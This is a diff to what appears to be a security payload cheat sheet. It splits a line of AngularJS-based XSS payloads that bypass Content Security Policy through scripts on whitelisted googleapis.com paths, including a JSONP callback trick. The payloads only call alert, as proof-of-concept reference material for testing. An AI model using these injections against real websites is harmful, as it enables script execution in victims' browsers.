@@ -217,7 +217,8 @@ If the application is using angular JS and scripts are loaded from a whitelisted
 
 **working payloads** :
 ```
-ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
+ng-app"ng-csp ng-click=$event.view.alert(1337)>
+<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
 "><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
 
 ```
